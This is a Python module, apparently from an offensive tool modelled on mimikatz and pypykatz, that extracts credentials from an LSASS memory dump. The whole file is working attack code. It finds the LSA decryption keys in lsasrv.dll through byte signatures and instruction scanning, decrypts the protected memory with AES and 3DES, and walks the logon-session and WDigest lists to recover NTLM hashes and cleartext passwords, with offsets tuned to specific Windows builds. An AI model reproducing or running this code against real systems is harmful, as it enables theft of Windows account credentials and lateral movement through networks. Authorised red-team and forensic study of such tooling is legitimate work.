"""Credential extraction from a parsed LSASS minidump.

Walks the in-memory structures of lsass.exe to locate and decrypt:
- MSV1.0 (NTLM hashes)
- WDigest (cleartext passwords on older systems)
- Kerberos tickets

This is the most complex component — structure offsets vary by Windows build.
We support Windows 10 1809+ / Server 2019+ (modern builds).

The extraction follows the same logic as pypykatz/mimikatz:
1. Find lsasrv.dll in the dump
2. Locate the crypto keys (LsaInitializeProtectedMemory / LsaEncryptMemory)
3. Walk credential linked lists
4. Decrypt credentials using the recovered keys
"""

import struct
from dataclasses import dataclass

from .minidump import Minidump

try:
    from Crypto.Cipher import AES, DES3

    HAS_CRYPTO = True
except ImportError:
    try:
        from Cryptodome.Cipher import AES, DES3

        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False


@dataclass
class Credential:
    """Extracted credential."""

    username: str
    domain: str
    auth_type: str  # "msv1_0", "wdigest", "kerberos"
    ntlm_hash: str = ""
    sha1_hash: str = ""
    password: str = ""


@dataclass
class LsaKeys:
    """Decryption keys extracted from lsasrv.dll memory."""

    des_key: bytes = b""
    aes_key: bytes = b""
    iv: bytes = b""


class CredentialExtractor:
    """Extract credentials from a parsed LSASS minidump."""

    def __init__(self, dump: Minidump):
        self.dump = dump
        self._keys: LsaKeys | None = None
        self._build = dump.sysinfo_build

    def extract(self) -> list[Credential]:
        """Main extraction routine. Returns all found credentials."""
        credentials = []

        # Step 1: Find and extract LSA decryption keys
        self._keys = self._find_lsa_keys()
        if not self._keys:
            raise RuntimeError(
                "Could not find LSA decryption keys in dump. "
                "The dump may be incomplete or from an unsupported Windows version."
            )

        # Step 2: Extract MSV1.0 credentials (NTLM hashes)
        credentials.extend(self._extract_msv())

        # Step 3: Extract WDigest (cleartext on Win7/2012 or if UseLogonCredential=1)
        credentials.extend(self._extract_wdigest())

        return credentials

    def _find_lsa_keys(self) -> LsaKeys | None:
        """Locate the LSA encryption keys in lsasrv.dll memory.

        The keys are initialized by LsaInitializeProtectedMemory and stored
        in global variables within lsasrv.dll:
        - h3DesKey / hAesKey (BCRYPT_KEY_HANDLE structures)
        - InitializationVector

        We find them by pattern-matching known byte sequences near the key storage.
        """
        lsasrv = self.dump.find_module("lsasrv")
        if not lsasrv:
            return None

        # Try all known patterns (most specific first)
        patterns = self._get_key_patterns()

        for pattern_info in patterns:
            results = self.dump.search_memory(pattern_info["pattern"])
            for addr in results:
                if not (lsasrv.base_address <= addr < lsasrv.base_address + lsasrv.size):
                    continue

                keys = self._extract_keys_at(addr, pattern_info)
                if keys and (keys.aes_key or keys.des_key):
                    return keys

        return None

    def _get_key_patterns(self) -> list[dict]:
        """Get the byte patterns for finding keys based on OS build.

        Strategy: find the pattern, then scan nearby for LEA RDX instructions
        that reference the key globals via RIP-relative addressing.
        """
        # The 'lea_scan' approach works across builds: find pattern in lsasrv,
        # scan nearby for LEA to .data section globals, identify IV+key handles
        return [
            {
                # Win10 1809+ / Win11: found near key generation in LsaEncryptMemory
                "pattern": b"\x83\x64\x24\x30\x00\x48\x8d\x45",
                "method": "lea_scan",
            },
            {
                # Win10 2004+ alternate
                "pattern": b"\x8b\xc0\x48\x8d\x05",
                "method": "lea_scan",
            },
            {
                # Older Windows 10
                "pattern": b"\x83\x64\x24\x30\x00\x44\x8b\x4c\x24",
                "method": "lea_scan",
            },
        ]

    def _extract_keys_at(self, addr: int, pattern_info: dict) -> LsaKeys | None:
        """Try to extract LSA keys given a pattern match address.

        Scans for LEA RDX/RCX instructions near the pattern that reference
        global data (RIP-relative). The globals form a group:
        IV (16 bytes) + hAesKey (8 bytes ptr) + h3DesKey (8 bytes ptr).
        """
        window_start = addr
        window = self.dump.read_memory(window_start, 64)
        if not window:
            return None

        lea_targets = []
        for i in range(len(window) - 7):
            if window[i] in (0x48, 0x4C) and window[i + 1] == 0x8D:
                reg = window[i + 2]
                if reg in (0x05, 0x0D, 0x15, 0x1D, 0x25, 0x2D, 0x35, 0x3D):
                    disp = struct.unpack_from("<i", window, i + 3)[0]
                    rip = window_start + i + 7
                    target = rip + disp
                    lea_targets.append(target)

        if not lea_targets:
            return None

        for target in lea_targets:
            keys = self._try_key_globals_at(target)
            if keys:
                return keys

        return None

    def _try_key_globals_at(self, candidate_addr: int) -> LsaKeys | None:
        """Check if candidate_addr is one of the key globals (IV, hAesKey, h3DesKey).

        Try the candidate as h3DesKey (last in the group), hAesKey, or as IV itself,
        and attempt to resolve the full set.
        """
        # Strategy: try candidate as h3DesKey (most common LEA target)
        # If so: hAesKey = candidate - 8, IV = candidate - 24
        for des_offset in (0, -8, -16):
            h3des_addr = candidate_addr - des_offset
            haes_addr = h3des_addr - 8
            iv_addr = h3des_addr - 24

            iv_data = self.dump.read_memory(iv_addr, 16)
            if not iv_data or iv_data == b"\x00" * 16:
                continue

            aes_ptr_data = self.dump.read_memory(haes_addr, 8)
            des_ptr_data = self.dump.read_memory(h3des_addr, 8)
            if not aes_ptr_data or not des_ptr_data:
                continue

            aes_handle = struct.unpack_from("<Q", aes_ptr_data)[0]
            des_handle = struct.unpack_from("<Q", des_ptr_data)[0]

            if not (0x1000 < aes_handle < 0x800000000000):
                continue
            if not (0x1000 < des_handle < 0x800000000000):
                continue

            aes_key = self._read_bcrypt_key(aes_handle)
            des_key = self._read_bcrypt_key(des_handle)

            if aes_key or des_key:
                keys = LsaKeys(iv=iv_data)
                if aes_key:
                    # Determine which is AES and which is 3DES by key length
                    if len(aes_key) == 24:
                        keys.des_key = aes_key
                    else:
                        keys.aes_key = aes_key
                if des_key:
                    if len(des_key) == 24:
                        keys.des_key = des_key
                    else:
                        keys.aes_key = des_key
                if keys.aes_key or keys.des_key:
                    return keys

        return None

    def _read_bcrypt_key(self, handle_ptr: int) -> bytes | None:
        """Read the actual key bytes from a BCRYPT_KEY_HANDLE/RUUU structure.

        Structure (Win10/11):
        +0x00: size (DWORD)
        +0x04: "RUUU" tag
        +0x08: ptr1
        +0x10: ptr2
        +0x18: padding
        +0x20: kssm_struct_size (DWORD)
        +0x24: "KSSM" tag
        +0x28: type/subtype
        +0x2C: mode
        +0x30: block_size
        ...
        +0x58: cbSecret (DWORD) = actual key length
        +0x5C: key_data (cbSecret bytes)
        """
        # Read enough to cover the full structure
        raw = self.dump.read_memory(handle_ptr, 256)
        if not raw:
            return None

        # Find KSSM tag
        kssm_off = raw.find(b"KSSM")
        if kssm_off == -1:
            kssm_off = raw.find(b"MSSK")
        if kssm_off == -1:
            return None

        # cbSecret is at KSSM + 52 (offset 48 from after the tag)
        cb_offset = kssm_off + 52
        if cb_offset + 4 > len(raw):
            return None

        cb_secret = struct.unpack_from("<I", raw, cb_offset)[0]
        if cb_secret not in (16, 24, 32):
            # Try alternate offset (some builds have it at KSSM+60)
            for alt_off in (56, 60, 48, 44):
                alt_cb_off = kssm_off + alt_off
                if alt_cb_off + 4 <= len(raw):
                    val = struct.unpack_from("<I", raw, alt_cb_off)[0]
                    if val in (16, 24, 32):
                        cb_secret = val
                        cb_offset = alt_cb_off
                        break
            else:
                return None

        key_offset = cb_offset + 4
        if key_offset + cb_secret > len(raw):
            # Need more data
            raw = self.dump.read_memory(handle_ptr, key_offset + cb_secret + 16)
            if not raw or key_offset + cb_secret > len(raw):
                return None

        key_data = raw[key_offset:key_offset + cb_secret]
        if key_data == b"\x00" * cb_secret:
            return None

        return key_data

    def _lsa_decrypt(self, encrypted: bytes) -> bytes:
        """Decrypt LSA-encrypted data using the recovered keys."""
        if not HAS_CRYPTO:
            raise RuntimeError(
                "pycryptodome is required for credential decryption. "
                "Install with: pip install pycryptodome"
            )

        if not self._keys:
            return b""

        iv = self._keys.iv

        if len(encrypted) % 8 != 0:
            # Not divisible by 8: use AES-CFB
            if not self._keys.aes_key:
                return b""
            cipher = AES.new(self._keys.aes_key, AES.MODE_CFB, iv, segment_size=128)
            return cipher.decrypt(encrypted)
        else:
            # Divisible by 8: use 3DES-CBC
            if not self._keys.des_key:
                return b""
            cipher = DES3.new(self._keys.des_key, DES3.MODE_CBC, iv[:8])
            return cipher.decrypt(encrypted)

    def _extract_msv(self) -> list[Credential]:
        """Extract MSV1.0 credentials (NTLM hashes).

        Uses the lsasrv.dll logon session hash table for all builds.
        Build >= 26000 (24H2): specific signature + 24H2 offsets.
        Build < 26000: LEA scanning + build-appropriate offsets.
        """
        if self._build >= 26000:
            return self._extract_msv_24h2()
        return self._extract_msv_via_sessions()

    def _find_session_table_via_lea(self, lsasrv) -> tuple[int, int] | None:
        """Find the logon session hash table by scanning lsasrv.dll for
        LEA instructions in .text that reference .data, validating each target.
        Returns (table_addr, nbuckets) or None."""
        lsasrv_data = self.dump.read_memory(lsasrv.base_address, lsasrv.size)
        if not lsasrv_data or len(lsasrv_data) < 0x3E:
            return None

        pe_off = struct.unpack_from("<I", lsasrv_data, 0x3C)[0]
        if pe_off + 24 > len(lsasrv_data):
            return None
        nsections = struct.unpack_from("<H", lsasrv_data, pe_off + 6)[0]
        opt_sz = struct.unpack_from("<H", lsasrv_data, pe_off + 20)[0]
        sec_off = pe_off + 24 + opt_sz

        text_va = text_sz = data_va = data_sz = 0
        for i in range(nsections):
            off = sec_off + i * 40
            if off + 40 > len(lsasrv_data):
                break
            name = lsasrv_data[off:off + 8].rstrip(b'\x00')
            if name == b'.text':
                text_sz = struct.unpack_from("<I", lsasrv_data, off + 8)[0]
                text_va = struct.unpack_from("<I", lsasrv_data, off + 12)[0]
            elif name == b'.data':
                data_sz = struct.unpack_from("<I", lsasrv_data, off + 8)[0]
                data_va = struct.unpack_from("<I", lsasrv_data, off + 12)[0]

        if not text_va or not data_va:
            return None

        data_abs = lsasrv.base_address + data_va
        data_end = data_abs + data_sz

        seen = set()
        for i in range(text_va, min(text_va + text_sz - 7, len(lsasrv_data) - 7)):
            if lsasrv_data[i] in (0x48, 0x4C) and lsasrv_data[i + 1] == 0x8D:
                modrm = lsasrv_data[i + 2]
                if modrm & 0xC7 == 0x05:
                    disp = struct.unpack_from("<i", lsasrv_data, i + 3)[0]
                    target = lsasrv.base_address + i + 7 + disp
                    if data_abs <= target < data_end and target not in seen:
                        seen.add(target)
                        nb = self._validate_session_table(target)
                        if nb:
                            return (target, nb)

        return None

    def _validate_session_table(self, table_addr: int) -> int:
        """Check if addr looks like a LIST_ENTRY hash table.
        Returns the bucket count (32/64) if valid, 0 otherwise.
        Empty buckets may be self-referencing or null-initialized."""
        for nbuckets in (64, 32):
            empty = 0
            valid = 0
            bad = False
            for bucket in range(nbuckets):
                ba = table_addr + bucket * 16
                data = self.dump.read_memory(ba, 16)
                if not data:
                    bad = True
                    break
                flink = struct.unpack_from("<Q", data, 0)[0]
                blink = struct.unpack_from("<Q", data, 8)[0]
                if (flink == ba and blink == ba) or (flink == 0 and blink == 0):
                    empty += 1
                elif 0x100000 < flink < 0x7FFFFFFFFFFF:
                    valid += 1
                else:
                    bad = True
                    break
            if not bad and empty >= nbuckets // 2 and valid >= 1:
                return nbuckets
        return 0

    def _extract_msv_via_sessions(self) -> list[Credential]:
        """Extract MSV credentials via lsasrv.dll logon session table (all pre-24H2 builds)."""
        lsasrv = self.dump.find_module("lsasrv")
        if not lsasrv:
            return []

        result = self._find_session_table_via_lea(lsasrv)
        if result is None:
            return []
        table_addr, nbuckets = result

        credentials = []
        for bucket in range(nbuckets):
            bucket_addr = table_addr + bucket * 16
            bucket_data = self.dump.read_memory(bucket_addr, 16)
            if not bucket_data:
                break
            flink = struct.unpack_from("<Q", bucket_data, 0)[0]
            if flink == 0 or flink == bucket_addr:
                continue

            current = flink
            visited = set()
            while current not in visited and current != 0 and current != bucket_addr:
                visited.add(current)
                cred = self._parse_logon_session(current)
                if cred:
                    credentials.append(cred)
                next_ptr = self.dump.read_ptr(current)
                if not next_ptr:
                    break
                current = next_ptr

        seen = set()
        unique = []
        for c in credentials:
            key = (c.username, c.domain, c.ntlm_hash)
            if key not in seen:
                seen.add(key)
                unique.append(c)
        return unique

    def _get_session_offsets(self) -> tuple[int, int, int]:
        """Return (username, domain, credentials_ptr) offsets based on build.

        Structures: KIWI_MSV1_0_LIST_6x (x64).
        """
        if self._build >= 9600:
            return (0x90, 0xA0, 0x108)
        if self._build >= 9200:
            return (0x78, 0x88, 0xF0)
        return (0x68, 0x78, 0xD8)

    def _parse_logon_session(self, addr: int) -> Credential | None:
        """Parse a logon session entry (all pre-24H2 builds)."""
        uname_off, dom_off, cred_off = self._get_session_offsets()
        read_sz = cred_off + 8

        entry = self.dump.read_memory(addr, read_sz)
        if not entry:
            return None

        username = self._read_unicode_string_from(entry, uname_off)
        domain = self._read_unicode_string_from(entry, dom_off)
        if not username:
            return None

        creds_ptr = struct.unpack_from("<Q", entry, cred_off)[0]
        if creds_ptr == 0:
            return None

        return self._follow_cred_chain(creds_ptr, username, domain, is_24h2=False)

    def _extract_msv_24h2(self) -> list[Credential]:
        """Extract MSV credentials for Win11 24H2 (build 26000+)."""
        credentials = []
        lsasrv = self.dump.find_module("lsasrv")
        if not lsasrv:
            return credentials

        sig = b"\x45\x89\x34\x24\x8b\xfb\x45\x85\xc0\x0f"
        hits = self.dump.search_memory(sig)
        sig_addr = None
        for h in hits:
            if lsasrv.base_address <= h < lsasrv.base_address + lsasrv.size:
                sig_addr = h
                break
        if sig_addr is None:
            return credentials

        ctx = self.dump.read_memory(sig_addr, 48)
        if not ctx:
            return credentials

        disp1 = struct.unpack_from("<i", ctx, 0x19)[0]
        base_addr = sig_addr + 0x19 + 4 + disp1

        disp2 = struct.unpack_from("<i", ctx, 0x22)[0]
        table_addr = base_addr + disp2

        for bucket in range(64):
            bucket_addr = table_addr + bucket * 16
            bucket_data = self.dump.read_memory(bucket_addr, 16)
            if not bucket_data:
                break
            flink = struct.unpack_from("<Q", bucket_data, 0)[0]
            if flink == 0 or flink == bucket_addr:
                continue

            current = flink
            visited = set()
            while current not in visited and current != 0 and current != bucket_addr:
                visited.add(current)
                cred = self._parse_logon_session_24h2(current)
                if cred:
                    credentials.append(cred)
                next_ptr = self.dump.read_ptr(current)
                if not next_ptr:
                    break
                current = next_ptr

        seen = set()
        unique = []
        for c in credentials:
            key = (c.username, c.domain, c.ntlm_hash)
            if key not in seen:
                seen.add(key)
                unique.append(c)
        return unique

    def _parse_logon_session_24h2(self, addr: int) -> Credential | None:
        """Parse a KIWI_MSV1_0_LIST_65 logon session entry (Win11 24H2).

        +0xA0: UserName, +0xB0: Domaine, +0x118: Credentials_list_ptr
        """
        entry = self.dump.read_memory(addr, 0x120)
        if not entry:
            return None

        username = self._read_unicode_string_from(entry, 0xA0)
        domain = self._read_unicode_string_from(entry, 0xB0)
        if not username:
            return None

        creds_ptr = struct.unpack_from("<Q", entry, 0x118)[0]
        if creds_ptr == 0:
            return None

        return self._follow_cred_chain(creds_ptr, username, domain, is_24h2=True)

    def _follow_cred_chain(self, creds_ptr: int, username: str, domain: str,
                           is_24h2: bool) -> Credential | None:
        """Follow the credential chain from a logon session to the NTLM hash.

        Credential chain (same across builds):
        Credentials_list_ptr → KIWI_MSV1_0_CREDENTIAL_LIST
          +0: Flink (8), +16: PrimaryCredentials_ptr (8)
        PrimaryCredentials_ptr → KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
          +0: Flink (8), +8: Primary ANSI_STRING (16)
          +24: encrypted_credentials UNICODE_STRING (Length(2)+MaxLen(2)+pad(4)+Buffer(8))
        """
        cred_list = self.dump.read_memory(creds_ptr, 24)
        if not cred_list:
            return None
        prim_ptr = struct.unpack_from("<Q", cred_list, 16)[0]
        if prim_ptr == 0:
            return None

        prim = self.dump.read_memory(prim_ptr, 40)
        if not prim:
            return None
        enc_len = struct.unpack_from("<H", prim, 24)[0]
        enc_ptr = struct.unpack_from("<Q", prim, 32)[0]
        if enc_len == 0 or enc_ptr == 0:
            return None

        encrypted = self.dump.read_memory(enc_ptr, enc_len)
        if not encrypted:
            return None
        decrypted = self._lsa_decrypt(encrypted)
        if not decrypted:
            return None

        if is_24h2:
            return self._parse_decrypted_cred_24h2(decrypted, username, domain)
        return self._parse_decrypted_cred(decrypted, username, domain)

    def _parse_decrypted_cred(self, decrypted: bytes, username: str,
                              domain: str) -> Credential | None:
        """Parse decrypted MSV1_0_PRIMARY_CREDENTIAL (pre-24H2).

        Three variants by build:
        1) Pre-Win10 (< 10240):
           +0x20: NtOwfPassword[16], +0x54: isNtOwfPassword
        2) Win10 1507/1511 (10240-10585):
           +0x21: isNtOwfPassword, +0x28: NtOwfPassword[16]
        3) Win10 1607+ (>= 14393, includes Server 2016/2019/2022):
           +0x29: isNtOwfPassword, +0x4A: NtOwfPassword[16]
        """
        if self._build >= 14393:
            if len(decrypted) < 0x5A:
                return None
            is_nt = decrypted[0x29]
            nt_off = 0x4A
        elif self._build >= 10240:
            if len(decrypted) < 0x38:
                return None
            is_nt = decrypted[0x21]
            nt_off = 0x28
        else:
            if len(decrypted) < 0x55:
                return None
            is_nt = decrypted[0x54]
            nt_off = 0x20

        if not is_nt:
            return None
        nt_hash = decrypted[nt_off:nt_off + 16]
        if nt_hash == b"\x00" * 16:
            return None
        return Credential(
            username=username, domain=domain,
            auth_type="msv1_0", ntlm_hash=nt_hash.hex(),
        )

    def _parse_decrypted_cred_24h2(self, decrypted: bytes, username: str,
                                    domain: str) -> Credential | None:
        """Parse decrypted MSV1_0_PRIMARY_CREDENTIAL (Win11 24H2).

        +40: isIso (1), +41: isNtOwfPassword (1)
        +70: NtOwfPassword (16)
        """
        if len(decrypted) < 86:
            return None
        is_iso = decrypted[40]
        is_nt = decrypted[41]
        if is_iso or not is_nt:
            return None
        nt_hash = decrypted[70:86]
        if nt_hash == b"\x00" * 16:
            return None
        return Credential(
            username=username, domain=domain,
            auth_type="msv1_0", ntlm_hash=nt_hash.hex(),
        )

    def _read_unicode_string_from(self, buf: bytes, offset: int) -> str:
        """Read a UNICODE_STRING from a buffer (Length at offset, Buffer ptr at offset+8)."""
        if offset + 16 > len(buf):
            return ""
        length = struct.unpack_from("<H", buf, offset)[0]
        ptr = struct.unpack_from("<Q", buf, offset + 8)[0]
        if length == 0 or ptr == 0 or length > 512:
            return ""
        raw = self.dump.read_memory(ptr, length)
        if not raw:
            return ""
        return raw.decode("utf-16-le", errors="replace")

    def _extract_wdigest(self) -> list[Credential]:
        """Extract WDigest credentials (cleartext passwords).

        Only available if UseLogonCredential is enabled (default on Win7/2008,
        disabled by default on Win8.1+/2012R2+).
        """
        credentials = []

        wdigest = self.dump.find_module("wdigest")
        if not wdigest:
            return credentials

        # Search for the WDigest credential list pattern
        pattern = b"\x48\x3b\xd9\x74"
        results = self.dump.search_memory(pattern)

        for addr in results:
            if not (wdigest.base_address <= addr < wdigest.base_address + wdigest.size):
                continue

            creds = self._walk_wdigest_list(addr)
            credentials.extend(creds)
            if creds:
                break

        return credentials

    def _walk_wdigest_list(self, pattern_addr: int) -> list[Credential]:
        """Walk the WDigest credential linked list."""
        credentials = []

        # Find list head via RIP-relative reference
        ref = self.dump.read_u32(pattern_addr - 4)
        if ref is None:
            return credentials

        list_head = pattern_addr + ref
        first_entry = self.dump.read_ptr(list_head)

        if not first_entry or first_entry == list_head:
            return credentials

        current = first_entry
        visited = set()

        for _ in range(256):
            if current in visited or current == 0 or current == list_head:
                break
            visited.add(current)

            # KIWI_WDIGEST_LIST_ENTRY (x64):
            # +0x00 Flink/Blink(16) +0x10 UsageCount(4)+pad(4) +0x18 This(8)
            # +0x20 LUID(8) +0x28 pad(8) +0x30 UserName(16) +0x40 Domaine(16) +0x50 Password(16)
            username = self._read_unicode_string(current + 0x30)
            domain = self._read_unicode_string(current + 0x40)
            encrypted_pw = self._read_unicode_string_raw(current + 0x50)

            if username and encrypted_pw:
                decrypted = self._lsa_decrypt(encrypted_pw)
                password = decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")

                if password and password != username:
                    credentials.append(Credential(
                        username=username,
                        domain=domain,
                        auth_type="wdigest",
                        password=password,
                    ))

            next_ptr = self.dump.read_ptr(current)
            if not next_ptr:
                break
            current = next_ptr

        return credentials

    def _read_unicode_string(self, addr: int) -> str:
        """Read a UNICODE_STRING structure and return the Python string."""
        length = self.dump.read_u16(addr)
        if not length or length > 512:
            return ""

        # Buffer pointer is at offset +8 (after Length(2) + MaxLength(2) + pad(4))
        buffer_ptr = self.dump.read_ptr(addr + 8)
        if not buffer_ptr:
            return ""

        data = self.dump.read_memory(buffer_ptr, length)
        if not data:
            return ""

        return data.decode("utf-16-le", errors="replace").rstrip("\x00")

    def _read_unicode_string_raw(self, addr: int) -> bytes:
        """Read the raw bytes of a UNICODE_STRING buffer."""
        length = self.dump.read_u16(addr)
        if not length or length > 1024:
            return b""

        buffer_ptr = self.dump.read_ptr(addr + 8)
        if not buffer_ptr:
            return b""

        data = self.dump.read_memory(buffer_ptr, length)
        return data if data else b""
